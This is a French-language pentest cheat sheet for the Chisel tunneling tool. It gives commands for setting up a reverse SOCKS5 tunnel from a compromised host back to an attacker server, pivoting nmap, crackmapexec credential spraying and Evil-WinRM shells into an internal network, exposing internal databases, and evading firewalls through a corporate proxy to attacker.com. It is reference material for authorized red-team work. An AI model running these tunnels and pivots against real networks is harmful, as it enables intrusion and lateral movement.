<!-- language-home-navigation -->
[🏠 Page d'accueil Française](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🚇 Chisel - Aide-mémoire complet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
   ██████╗██╗  ██╗██╗███████╗███████╗██╗     
  ██╔════╝██║  ██║██║██╔════╝██╔════╝██║     
  ██║     ███████║██║███████╗█████╗  ██║     
  ██║     ██╔══██║██║╚════██║██╔══╝  ██║     
  ╚██████╗██║  ██║██║███████║███████╗███████╗
   ╚═════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝
      Fast TCP/UDP Tunnel over HTTP via SSH
```
<p align="center">
  <img src="https://img.shields.io/badge/Chisel-Tunneling-orange?style=for-the-badge" alt="Chisel">
  <img src="https://img.shields.io/badge/HTTP_WebSocket-Evasion-blue?style=for-the-badge" alt="WebSocket">
  <img src="https://img.shields.io/badge/SOCKS5-Proxy-green?style=for-the-badge" alt="SOCKS5">
  <img src="https://img.shields.io/badge/Go-Portable-red?style=for-the-badge" alt="Go">
</p>

<p align="center">
  <b>⚡ Tunnel TCP/UDP rapide transporté via HTTP, sécurisé via SSH, présenté sous la forme d'un seul binaire portable</b>
</p>

---

## 📋 Table des matières

- [Introduction](#-introduction)
- [Comment ça marche](#-comment-ça-fonctionne)
- [Installation](#-installation)
- [Modes Architecture et Tunnel](#-architecture--modes-tunnel)
- [Configuration Pentest standard : Proxy SOCKS5 inversé](#-standard-pentest-setup-reverse-socks5-proxy)
  - [Étape 1 : Démarrer le serveur sur l'attaquant](#step-1-start-server-on-attaquant)
  - [Étape 2 : Connecter le client à partir de la cible](#step-2-connect-client-from-target)
  - [Étape 3 : Configurer les chaînes proxy](#step-3-configure-proxychains)
  - [Étape 4 : Exécuter les outils via le tunnel](#step-4-execute-tools-over-the-tunnel)
- [Redirection de port local](#-local-port-forwarding)
- [Redirection de port à distance (capture du trafic entrant)] (#-remote-port-forwarding-catcher-inbound-traffic)
- [Authentification et épinglage d'empreintes digitales](#-authentification--épinglage d'empreintes digitales)
- [Évasion de sortie et chaînage de proxy HTTP](#-egress-evasion--http-proxy-chaining)
- [Chisel contre Ligolo-ng contre SSH](#-chisel-vs-ligolo-ng-vs-ssh)
- [Tableau de référence rapide](#-quick-reference-table)
- [Conseils et bonnes pratiques](#-conseils--meilleures pratiques)
- [Mentions légales](#-legal-disclaimer)
- [Ressources](#-ressources)

---

## 🎯Présentation

**Chisel** est un outil de tunneling multiplateforme open source écrit en Go qui encapsule des sessions SSH sécurisées dans des connexions HTTP/WebSocket standard.

Étant donné que le trafic ressemble à une communication HTTP/HTTPS ou WebSocket standard sur le fil, Chisel navigue facilement à travers les pare-feu restrictifs, les systèmes d'inspection approfondie des paquets (DPI) et les proxys Web d'entreprise qui bloqueraient normalement le trafic brut SSH ou VPN.

### Points forts

- 🚀 **Single Binary :** Contient à la fois le serveur et le client dans un binaire autonome compilé statiquement.
- 🛡️ **Firewall Evasion :** Tunnels sur le port standard 80/443 ou WebSockets pour se fondre dans le trafic Web régulier.
- 🔒 **Chiffré par défaut :** Utilise le crypto SSH sous le capot (clés ECDSA et AES-GCM).
- 🔄 **SOCKS5 et redirection de port :** Crée sans effort des proxys SOCKS5 inversés ou des ports transférés locaux/à distance spécifiques.

---

## 🏗️ Comment ça marche
```
+------------------------------------+                         +-----------------------------------+
|          Attacker Machine          |                         |       Compromised Target Host     |
|          (192.168.1.100)           |                         |            (Dual-homed)           |
|                                    |                         |                                   |
| [chisel server --reverse -p 8080]  | <==== HTTP/WebSocket == | [chisel client 192.168.1.100:8080 |
|               |                    |       (TCP Port 8080)   |                 R:1080:socks]     |
|               v                    |                         |                  |                |
|  Local Port 1080 (SOCKS5 Proxy)    |                         |                  v                |
|               |                    |                         |        Internal Network Interface |
|      [proxychains nmap]            |                         |            (172.16.1.0/24)        |
+------------------------------------+                         +-----------------------------------+
```
---

## 📥Installation

###Kali Linux
```bash
sudo apt update && sudo apt install -y chisel
```
### Depuis la source (Aller)
```bash
go install github.com/jpillora/chisel@latest
```
### Télécharger les binaires précompilés

Téléchargez des binaires autonomes pour Linux, Windows et macOS à partir des versions officielles :
```bash
# Attacker Linux 64-bit
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gzip -d chisel_1.9.1_linux_amd64.gz && mv chisel_1.9.1_linux_amd64 chisel && chmod +x chisel

# Windows Target 64-bit
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
gzip -d chisel_1.9.1_windows_amd64.gz && mv chisel_1.9.1_windows_amd64 chisel.exe
```
---

## 🔄 Configuration Pentest standard : proxy SOCKS5 inversé

Dans les tests d'intrusion standard et les CTF, la machine cible se trouve derrière des NAT/pare-feu et ne peut pas accepter de connexions entrantes directes de votre part. Vous devez créer un **proxy SOCKS5 inversé**.

### Étape 1 : Démarrer le serveur sur l'attaquant

Démarrez le serveur Chisel en écoutant sur le port `8000` (ou `443` pour l'évasion) avec la redirection de port inversée autorisée :
```bash
chisel server --reverse -p 8000 -v
```
### Étape 2 : Connecter le client à partir de la cible

Exécutez le client sur la machine compromise, en vous reconnectant à l'adresse IP de votre attaquant et en ouvrant un proxy SOCKS5 inversé :

#### Cible Linux :
```bash
./chisel client 192.168.1.100:8000 R:1080:socks
```
#### Cible Windows :
```powershell
.\chisel.exe client 192.168.1.100:8000 R:1080:socks
```
> **Résultat :** Le serveur Chisel sur la machine de votre attaquant ouvre le port `1080` localement en tant que proxy SOCKS5 routé via la cible !

### Étape 3 : Configurer les chaînes proxy

Modifiez `/etc/proxychains4.conf` (ou `/etc/proxychains.conf`) sur la machine de votre attaquant :
```ini
[ProxyList]
# protocol  host        port
socks5      127.0.0.1   1080
```
### Étape 4 : Exécuter les outils via le tunnel

Préfixez n'importe quel outil avec `proxychains` pour l'acheminer via l'hôte interne compromis :
```bash
# Nmap TCP Connect scan
proxychains nmap -sT -Pn -p 80,445,3389 172.16.1.50

# SMB authentication
proxychains crackmapexec smb 172.16.1.0/24 -u Administrator -p 'Password123'

# Evil-WinRM shell to an internal domain controller
proxychains evil-winrm -i 172.16.1.5 -u Administrator -p 'Password123'
```
---

## 🔀 Redirection de port local

Transférez un port interne spécifique derrière la cible directement vers la machine de votre attaquant local sans avoir besoin d'un proxy SOCKS complet.

### Exemple : Accéder au service Web interne (Port 80)

Serveur sur l'attaquant (`192.168.1.100:8000`) :
```bash
chisel server --reverse -p 8000
```
Client visé :
```bash
# Forward target's internal localhost:80 to attacker's localhost:8080
./chisel client 192.168.1.100:8000 R:8080:127.0.0.1:80
```
Accédez maintenant à `http://127.0.0.1:8080` sur la machine de votre attaquant pour afficher le serveur Web interne !

### Exemple : exposer la base de données interne (MySQL 3306)

Client visé :
```bash
./chisel client 192.168.1.100:8000 R:3306:172.16.1.200:3306
```
Connectez-vous directement depuis votre terminal attaquant :
```bash
mysql -h 127.0.0.1 -P 3306 -u root -p
```
---

## 🌐 Redirection de port à distance (capture du trafic entrant)

Exposez un port sur la machine cible qui renvoie vers un service sur la machine de votre attaquant (utile pour servir des charges utiles ou intercepter des rappels).
```bash
# Target opens port 9000, sending incoming connections to attacker's 9000
./chisel client 192.168.1.100:8000 9000:127.0.0.1:9000
```
---

## 🔐 Authentification et épinglage d'empreintes digitales

Dans les environnements réels, les ports Chisel ouverts peuvent être détournés par des parties non autorisées. Protégez votre tunnel avec l'authentification :

### Authentification (`--auth`)
```bash
# Attacker server enforces credentials
chisel server --reverse -p 8443 --auth "pentestuser:ComplexPassw0rd!"

# Target client authenticates
./chisel client --auth "pentestuser:ComplexPassw0rd!" 192.168.1.100:8443 R:1080:socks
```
### Épinglage d'empreintes digitales (`--fingerprint`)

Lorsque le serveur démarre, il imprime l'empreinte de sa clé publique SSH :
```
2026/10/29 20:00:00 server: Fingerprint 8a:1f:9c:...
```
Vérifiez-le sur le client pour empêcher l'interception MITM :
```bash
./chisel client --fingerprint "8a:1f:9c:..." 192.168.1.100:8443 R:1080:socks
```
---

## 🛡️ Évasion de sortie et chaînage de proxy HTTP

Si la cible interne ne peut accéder à Internet que via un proxy d'entreprise authentifiant :
```bash
# Route Chisel traffic through an upstream corporate proxy
./chisel client --proxy http://proxy.corp.local:8080 \
  --header "Proxy-Authorization: Basic dXNlcjpwYXNz" \
  https://attacker.com:443 R:1080:socks
```
---

## ⚖️ Chisel contre Ligolo-ng contre SSH

| Fonctionnalité | Ciseau | Ligolo-ng | Tunneling SSH |
|---------|--------|---------------|---------------|
| **Méthode principale** | SOCKS5 et redirection de port | Interface TUN (VPN) | SOCKS5 et redirection de port |
| **Protocole de transport** | HTTP/WebSocket | TLS brut | SSH (Port 22) |
| **Évasion du pare-feu** | ⭐⭐⭐⭐⭐ Exceptionnel | ⭐⭐⭐⭐ Très bien | ⭐⭐ Mauvais (port 22 généralement bloqué) |
| **Nécessite racine/administrateur**| ❌ Non (Userland uniquement) | ✅ Oui (Pour créer un appareil TUN) | ❌ Non |
| **Nmap SYN Scan (`-sS`)**| ❌ Non | ✅ Oui | ❌ Non |
| **Prise en charge UDP** | Partiel (via SOCKS5) | ✅ UDP natif complet | ❌ Très limité |

---

## 📊 Tableau de référence rapide

| Mode | Commande | Objectif |
|------|---------|---------|
| **Serveur (inverse)** | `chisel server --reverse -p 8000` | Démarrer l'écoute inversée du serveur sur 8000 |
| **Client (SOCKS inversées5)** | `chisel client <IP>:8000 R:1080:socks` | Créer un SOCKS5 inversé sur le port 1080 de l'attaquant |
| **Client (port avant)** | `chisel client <IP>:8000 R:8080:127.0.0.1:80` | Mapper le port 80 de la cible sur le port 8080 de l'attaquant |
| **Client (exposer le port de l'attaquant)** | `chisel client <IP>:8000 4444:127.0.0.1:4444` | Ouvrir le port 4444 sur le routage cible vers l'attaquant |
| **Serveur d'authentification** | `chisel server --reverse --auth "u:p" -p 8000` | Exiger les informations d'identification des clients connectés |
| **Client d'authentification** | `chisel client --auth "u:p" <IP>:8000 R:socks` | Connectez-vous avec vos identifiants |
| **Réglage Keep-Alive** | `chisel client --keepalive 10s <IP>:8000 R:socks`| Empêcher les abandons de sessions inactives du pare-feu |

---

## 💡 Conseils et bonnes pratiques

1. **Utilisez le port 443 pour une évasion maximale :**
   Les pare-feu inspectent souvent le trafic sur des ports arbitraires comme 8000 ou 8080. L'exécution de votre serveur Chisel sur le port `443` garantit que le trafic est identique aux WebSockets HTTPS.
2. **Régler le délai d'expiration des chaînes proxy :**
   Si les connexions des chaînes proxy semblent lentes, modifiez `/etc/proxychains4.conf` et définissez :
   ```ini
   tcp_read_time_out 15000
   tcp_connect_time_out 8000
   ```
3. **Aucun privilège root requis sur la cible :**
   Contrairement aux solutions VPN ou TUN, Chisel fonctionne uniquement dans l'espace utilisateur. Vous pouvez exécuter `chisel.exe` ou `chisel` en tant que comptes de service à faible privilège (`www-data`, `nobody`, utilisateur Windows standard).

---

## ⚠️ Mentions légales

> **IMPORTANT :** Chisel est destiné aux tests de réseau autorisés, à la simulation d'équipe rouge et à l'administration de systèmes. Le déploiement d'outils de tunneling sur des réseaux non autorisés viole les lois sur la sécurité informatique.

---

## 📚 Ressources

- [Dépôt Chisel GitHub](https://github.com/jpillora/chisel)
- [Projet Proxychains-NG](https://github.com/rofl0r/proxychains-ng)